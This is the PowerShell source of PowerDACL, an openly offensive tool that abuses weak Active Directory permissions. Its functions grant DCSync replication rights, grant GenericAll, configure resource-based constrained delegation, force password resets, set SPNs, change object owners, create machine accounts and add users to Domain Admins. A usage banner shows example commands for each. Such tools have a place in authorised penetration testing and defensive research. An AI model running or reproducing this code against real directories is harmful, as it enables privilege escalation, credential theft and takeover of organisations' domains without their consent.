function PowerDACL{
	
	<#

	.SYNOPSIS
	PowerDACL | Author: Rob LP (@L3o4j)
 	https://github.com/Leo4j/PowerDACL
	
	.DESCRIPTION
	A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)
	
	#>
	
	Write-Output " "
	Write-Output " PowerDACL | Author: Rob LP (@L3o4j)"
	Write-Output " "
	Write-Output " https://github.com/Leo4j/PowerDACL"
	Write-Output " "
	Write-Output " A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)"
	Write-Output " "
	Write-Output " Grant DCSync rights:"
	Write-Output "  DCSync -Target username"
	Write-Output "  DCSync -Target username -TargetDomain userdomain"
	Write-Output " "
	Write-Output " Grant GenericAll rights:"
	Write-Output "  GenericAll -Target MSSQL01$ -Grantee username"
	Write-Output "  GenericAll -Target MSSQL01$ -TargetDomain acme.local -Grantee username -GranteeDomain domain.local"
	Write-Output " "
	Write-Output " Set RBCD:"
	Write-Output "  RBCD -Target MSSQL01$ -Grantee username"
	Write-Output "  RBCD -Target MSSQL01$ -TargetDomain domain.local -Grantee username -GranteeDomain acme.local"
	Write-Output "  RBCD -Target MSSQL01$ -Clear"
	Write-Output " "
	Write-Output " Add Computer to domain:"
	Write-Output "  AddComputer -ComputerName evilcomputer -Password P@ssw0rd!"
	Write-Output "  AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local"
	Write-Output " "
	Write-Output " Delete Computer from domain:"
	Write-Output "  DeleteComputer -ComputerName evilcomputer"
	Write-Output "  DeleteComputer -ComputerName evilcomputer -Domain ferrari.local"
	Write-Output " "
	Write-Output " Force Change Password:"
	Write-Output "  ForceChangePass -Target username -Password P@ssw0rd!"
	Write-Output "  ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain usserdomain"
	Write-Output " "
	Write-Output " Set SPN:"
	Write-Output "  SetSPN -Target username"
	Write-Output "  SetSPN -Target username -TargetDomain userdomain -SPN `"test/test`""
	Write-Output " "
	Write-Output " Remove SPN:"
	Write-Output "  RemoveSPN -Target username"
	Write-Output "  RemoveSPN -Target username -TargetDomain userdomain"
	Write-Output " "
	Write-Output " Set Owner:"
	Write-Output "  SetOwner -Target MSSQL01$ -Owner username"
	Write-Output "  SetOwner -Target MSSQL01$ -TargetDomain acme.local -Owner username -OwnerDomain domain.local"
	Write-Output " "
	Write-Output " Enable Account:"
	Write-Output "  EnableAccount -Target myComputer$"
	Write-Output "  EnableAccount -Target myComputer$ -Domain userdomain"
	Write-Output " "
	Write-Output " Disable Account:"
	Write-Output "  DisableAccount -Target myComputer$"
	Write-Output "  DisableAccount -Target myComputer$ -Domain userdomain"
	Write-Output " "
	Write-Output " Add object to a group:"
	Write-Output "  AddToGroup -Target user -Group `"Domain Admins`""
	Write-Output "  AddToGroup -Target user -Group `"Domain Admins`" -Domain userdomain"
	Write-Output " "
	Write-Output " Remove object from a group:"
	Write-Output "  RemoveFromGroup -Target user -Group `"Domain Admins`""
	Write-Output "  RemoveFromGroup -Target user -Group `"Domain Admins`" -Domain userdomain"
	Write-Output " "
}

function DCSync {
	param (
        [string]$Target,
        [string]$TargetDomain,
        [switch]$Remove
    )
	
	if($TargetDomain){
		$domainDN = $TargetDomain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	else{
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	
	try {
        $GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
		
		$ReplicationRightsGUIDs = @(
            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
            '89e95b76-444d-4c62-991a-0facbeda640c'
        )
		
		$GrabObjectSID = $GrabObject.objectsid
		
		$byteArray = @()
		foreach ($item in $GrabObjectSID) {
			if ($item -is [System.Byte[]]) {
				$byteArray += $item
			} else {
				$byteArray += [byte]$item
			}
		}
		
		$GrabObjectExtractedSID = GetSID-FromBytes -sidBytes $byteArray
		
		$GrabObjectSID = [System.Security.Principal.SecurityIdentifier]$GrabObjectExtractedSID
		
        $TargetEntry = [ADSI]"LDAP://$($domainDN)"
        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
        $ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity

        foreach ($GUID in $ReplicationRightsGUIDs) {

            $RightGUID = New-Object Guid $GUID

            $AccessControlType = if ($Remove) {
                [System.Security.AccessControl.AccessControlType]::Deny
            } else {
                [System.Security.AccessControl.AccessControlType]::Allow
            }

            $ADRights = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight

            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (
                $GrabObjectSID,
                $ADRights,
                $AccessControlType,
                $RightGUID,
                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
            )

            if ($Remove) {
                Write-Verbose "Removing replication right $GUID from $Target."
                $ObjectSecurity.RemoveAccessRule($ACE) | Out-Null
            } else {
                Write-Verbose "Granting replication right $GUID to $Target."
                $ObjectSecurity.AddAccessRule($ACE) | Out-Null
            }
        }

        $TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
        $TargetEntry.PsBase.CommitChanges()
        Write-Output "[+] Successfully updated DS-Replication rights for $Target"
    } catch {
        Write-Output "[-] Failed to update DS-Replication rights for $Target. Error: $_"
    }
}

function SetOwner {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$Owner, 
        [string]$OwnerDomain
    )
	
	try {
        $GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
        $GrabObjectDN = $GrabObject.distinguishedname

        $GrabOwner = Get-ADSIObject -Domain $OwnerDomain -samAccountName $Owner
        $OwnerSID = $GrabOwner.objectsid
		
		$byteArray = @()
		foreach ($item in $OwnerSID) {
			if ($item -is [System.Byte[]]) {
				$byteArray += $item
			} else {
				$byteArray += [byte]$item
			}
		}
		$OwnerExtractedSID = GetSID-FromBytes -sidBytes $byteArray

        $TargetEntry = [ADSI]"LDAP://$($GrabObjectDN)"
        $TargetEntry.PsBase.Options.SecurityMasks = 'Owner'
        $ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity

        $NewOwner = New-Object System.Security.Principal.SecurityIdentifier($OwnerExtractedSID)
        $ObjectSecurity.SetOwner($NewOwner)
        Write-Verbose "Set new owner to $Owner for $Target."

        $TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
        $TargetEntry.PsBase.CommitChanges()
        Write-Output "[+] Successfully set $Owner as the owner of $Target."
    } catch {
        Write-Output "[-] Failed to set owner for $Target to $Owner. Error: $_"
    }
}

function GenericAll {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$Grantee,
        [string]$GranteeDomain
    )
	
	$GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
	$GrabObjectDN = $GrabObject.distinguishedname
	
	$GrabGrantee = Get-ADSIObject -Domain $GranteeDomain -samAccountName $Grantee
	$GrabGranteeSID = $GrabGrantee.objectsid
	$byteArray = @()
	foreach ($item in $GrabGranteeSID) {
		if ($item -is [System.Byte[]]) {
			$byteArray += $item
		} else {
			$byteArray += [byte]$item
		}
	}
	$GranteeExtractedSID = GetSID-FromBytes -sidBytes $byteArray
	
	$TargetEntry = [ADSI]"LDAP://$($GrabObjectDN)"
	$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
	$ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
	
	$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$GranteeExtractedSID)),[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,[System.Security.AccessControl.AccessControlType]::Allow,[System.DirectoryServices.ActiveDirectorySecurityInheritance]::None)
	
	$ObjectSecurity.AddAccessRule($ACE)
	$TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
	try {
		$TargetEntry.PsBase.CommitChanges()
		Write-Output "[+] Successfully granted GenericAll to $Target for $Grantee"
	}
	catch {Write-Output "[-] Failed to grant GenericAll to $Target for $($Grantee): $_ `n"}
}

function ForceChangePass {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$Password
    )
	
	try{
		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
		$user = [ADSI]"LDAP://$($GrabObject)"
		$user.SetPassword($Password)
		Write-Output "[+] Successfully changed password for $Target"
	} catch {
		Write-Output "[-] Error while changing password for target: $_"
	}
}

function SetSPN {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$SPN = "fake/fake"
    )
	
	try{
		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
		$user = [ADSI]"LDAP://$($GrabObject)"
		$user.Put("servicePrincipalName", $SPN); $user.SetInfo()
		Write-Output "[+] Successfully added SPN $SPN to $Target"
	} catch {
		Write-Output "[-] Error occurred while adding SPN to target: $_"
	}
}

function RemoveSPN {
	param (
        [string]$Target,
        [string]$TargetDomain
    )
	
	try{
		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
		$user = [ADSI]"LDAP://$($GrabObject)"
		$existingSPNs = $user.Properties["servicePrincipalName"]
		
		if ($existingSPNs.Count -gt 0) {
			$user.Properties["servicePrincipalName"].Clear()
            $user.SetInfo()
			Write-Output "[+] Successfully removed SPNs from $Target"
		}
		
		else {
			Write-Output "[-] No SPNs found for $Target"
		}
	} catch {
		Write-Output "[-] Error occurred while removing SPN from target: $_"
	}
}

function EnableAccount {
	param (
        [string]$Target,
        [string]$Domain
    )
	
	if($Domain){
		$domainDN = $Domain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	else{
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}

    try {
		
		if (-not $Target.EndsWith('$')) {
			$account = ([ADSI]"LDAP://CN=$Target,CN=Users,$domainDN")
		}
		
        else{
			$Target = $Target -replace '\$',''
			$account = ([ADSI]"LDAP://CN=$Target,CN=Computers,$domainDN")
		}

        $uac = $account.Properties["userAccountControl"][0]
		
		if($uac -eq '4096'){Write-Output "[*] Account is already enabled"}
		
        else{
			$newUac = $uac -band -3
			$account.Put("userAccountControl", $newUac)
			$account.SetInfo()
			Write-Output "[+] Successfully enabled account $Target"
		}
    } catch {
        Write-Output "[-] Error occurred while enabling account $($Target): $_"
    }
}

function DisableAccount {
	param (
        [string]$Target,
        [string]$Domain
    )
	
	if($Domain){
		$domainDN = $Domain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	else{
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}

    try {
		if (-not $Target.EndsWith('$')) {
			$account = ([ADSI]"LDAP://CN=$Target,CN=Users,$domainDN")
		}
		
        else{
			$Target = $Target -replace '\$',''
			$account = ([ADSI]"LDAP://CN=$Target,CN=Computers,$domainDN")
		}

        $uac = $account.Properties["userAccountControl"][0]
        
		if($uac -eq '4098'){Write-Output "[*] Account is already disabled"}
		
		else{
			$newUac = $uac -bor 2
			$account.Put("userAccountControl", $newUac)
			$account.SetInfo()
			Write-Output "[+] Successfully disabled account $Target"
		}
    } catch {
        Write-Output "[-] Error occurred while disabling account $($Target): $_"
    }
}

function AddComputer {
	param (
        [string]$ComputerName,
        [string]$Password,
        [string]$Domain
    )
	
	if($Domain){
		$domainDN = $Domain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	else{
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	
	try{
	
		$computersContainer = [ADSI]"LDAP://CN=Computers,$domainDN"
		
		$newComputer = $computersContainer.Create("Computer", "CN=$ComputerName")
		
		$newComputer.Put("sAMAccountName", "$ComputerName`$")
  		$newComputer.Put("userAccountControl", 4096)
		$newComputer.Put("dNSHostName",  "$ComputerName.$Domain")
		
		$spns = @(
			"HOST/$ComputerName.$Domain",
			"RestrictedKrbHost/$ComputerName.$Domain",
			"HOST/$ComputerName",
			"RestrictedKrbHost/$ComputerName"
		)
		$newComputer.Put("servicePrincipalName", $spns)
		
		$newComputer.SetInfo()
		
		if($Password){
			([ADSI]"LDAP://CN=$ComputerName,CN=Computers,$domainDN").SetPassword($Password)
			
			Write-Output "[+] Successfully added computer $ComputerName to the domain with password $Password"
		}
		else{
			Write-Output "[+] Successfully added computer $ComputerName to the domain with empty password"
		}
	}
	
	catch {
		Write-Output "[-] Error occurred while adding computer $ComputerName to domain: $_"
	}
}

function DeleteComputer {
	param (
        [string]$ComputerName,
        [string]$Domain
    )
	
	if($Domain){
		$domainDN = $Domain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	else{
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
		$domainDN = "DC=$domainDN"
	}
	
	try{
	
		$computersContainer = [ADSI]"LDAP://CN=Computers,$domainDN"
		
		if (-not $ComputerName.EndsWith('$')) {
			$ComputerName += '$'
		}
		
		$computerObject = (Get-ADSIObject -Domain $Domain -samAccountName $ComputerName).distinguishedname
		
		$computerObject = ($computerObject -split ",")[0]
		
		if ($computerObject -ne $null) {
            $computersContainer.Delete("Computer", "$computerObject")
            Write-Output "[+] Successfully deleted computer $ComputerName from the domain"
        } else {
            Write-Output "[*] Computer $ComputerName does not exist in the domain"
        }
	}
	
	catch {
		Write-Output "[-] Error occurred while removing computer $ComputerName from domain: $_"
	}
}

function AddToGroup {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$Group,
		[string]$GroupDomain
    )
	
	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
	
	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -samAccountName $Group).distinguishedname
	
	try{
		([ADSI]"LDAP://$($GrabGroup)").Add("LDAP://$($GrabObject)")
		Write-Output "[+] Successfully added $Target to group $Group"
	} catch {
		Write-Output "[-] Error occurred while adding $Target to $($Group): $_"
	}
}

function RemoveFromGroup {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$Group,
		[string]$GroupDomain
    )
	
	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
	
	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -samAccountName $Group).distinguishedname
	
	try{
		([ADSI]"LDAP://$($GrabGroup)").Remove("LDAP://$($GrabObject)")
		Write-Output "[+] Successfully removed $Target from group $Group"
	} catch {
		Write-Output "[-] Error occurred while removing $Target from $($Group): $_"
	}
}

function RBCD {
	param (
        [string]$Target,
        [string]$TargetDomain,
		[string]$Grantee,
		[string]$GranteeDomain,
		[switch]$Clear
    )
	
	if($Clear){
		Set-DomainObject -Identity $Target -Domain $TargetDomain -Clear @('msDS-AllowedToActOnBehalfOfOtherIdentity')
		break
	}
	
	$extractedRawSID = (Get-ADSIObject -Domain $GranteeDomain -samAccountName $Grantee).objectsid
	
	$byteArray = @()

	foreach ($item in $extractedRawSID) {
		if ($item -is [System.Byte[]]) {
			$byteArray += $item
		} else {
			$byteArray += [byte]$item
		}
	}
	
	$extractedSID = GetSID-FromBytes -sidBytes $byteArray
	
	$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$extractedSID)"
	
	$rsdb = New-Object byte[] ($rsd.BinaryLength)
	
	$rsd.GetBinaryForm($rsdb, 0)
	
	Set-DomainObject -Identity $Target -Domain $TargetDomain -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb}
}

function Set-DomainObject {	
    param (
        [string]$Identity,
        [hashtable]$Set = @{},
        [string[]]$Clear = @(),
        [string]$Domain
    )

    function Set-Values {
        param (
            [ADSI]$Entry,
            [hashtable]$Set
        )

        foreach ($key in $Set.Keys) {
            $value = $Set[$key]
            Write-Output "[+] Setting $key to $value for $($Entry.sAMAccountName)"
            try {
                $Entry.put($key, $value)
            }
            catch {
                Write-Output "[-] Error setting/replacing property '$key' for object '$($Entry.sAMAccountName)' : $_"
            }
        }
    }

    function Clear-Values {
        param (
            [ADSI]$Entry,
            [string[]]$Clear
        )

        foreach ($key in $Clear) {
            Write-Output  "[+] Clearing $key for $($Entry.sAMAccountName)"
            try {
                $Entry.psbase.Properties[$key].Clear()
            }
            catch {
                Write-Output "[-] Error clearing property '$key' for object '$($Entry.sAMAccountName)' : $_"
            }
        }
    }

    try {
        $Entry = (Get-ADSIObject -samAccountName $Identity -Domain $Domain -Raw).GetDirectoryEntry()
    }
    catch {
        Write-Output "[-] Error retrieving object with Identity '$Identity' : $_"
        return
    }

    if ($Set.Count -gt 0) {
        Set-Values -Entry $Entry -Set $Set
        try {
            $Entry.SetInfo()
        }
        catch {
            Write-Output "[-] Error committing changes for object '$Identity' : $_"
        }
    }

    if ($Clear.Length -gt 0) {
        Clear-Values -Entry $Entry -Clear $Clear
        try {
            $Entry.SetInfo()
        }
        catch {
            Write-Output "[-] Error committing changes for object '$Identity' : $_"
        }
    }
}

function Get-ADSIObject {
    param (
        [string]$samAccountName,
        [string]$Domain,
		[switch]$Raw
    )
    if ($Domain) {
        $root = "$Domain" -replace "\.", ",DC="
        $domainPath = "DC=" + "$root"
    } else {
        $root = [ADSI]"LDAP://RootDSE"
        $domainPath = $root.defaultNamingContext
    }
    $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$domainPath")
    $searcher.Filter = "(&(sAMAccountName=$samAccountName))"
    $result = $searcher.FindOne()

    if($Raw){
		if ($result -ne $null) {
			return $result
		}
		else {
			throw "[-] Object with samAccountName '$samAccountName' not found."
		}
	}
	else{
		if ($result -ne $null) {

			$properties = @{}
			foreach ($propName in $result.Properties.PropertyNames) {
				$properties[$propName] = $result.Properties[$propName]
			}

			return [PSCustomObject]$properties
		} else {
			throw "[-] Object with samAccountName '$samAccountName' not found."
		}
	}
}

function GetSID-FromBytes {
	param (
        [byte[]]$sidBytes
    )
	
	$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
	$stringSid = $sid.Value
	return $stringSid
}
